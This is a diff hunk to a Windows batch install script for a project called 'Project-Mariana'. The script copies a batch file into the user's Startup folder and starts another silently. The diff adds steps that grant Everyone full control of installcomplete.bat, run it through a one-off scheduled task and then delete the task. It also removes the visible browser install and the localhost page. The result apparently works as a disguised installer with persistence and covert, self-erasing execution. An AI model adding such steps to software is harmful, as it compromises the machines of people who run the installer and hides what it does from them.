@@ -23,8 +23,8 @@ cd Project-Mariana
 python -m pip install cryptography psutil requests flask flask-cors
 copy "startup.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 start /B "" "runner.bat"
-echo "Installation complete"
+icacls installcomplete.bat /grant Everyone:F
+schtasks /create /tn "MarianaInst" /tr "%~dp0installcomplete.bat" /sc once /st 00:00 /ru "INTERACTIVE" /f
+schtasks /run /tn "MarianaInst"
+schtasks /delete /tn "MarianaInst" /F
 timeout /T 30
-start /wait msiexec /i "../mariana-browser.msi" /passive
-start /B "" "http://localhost:8000"
-timeout /T 3
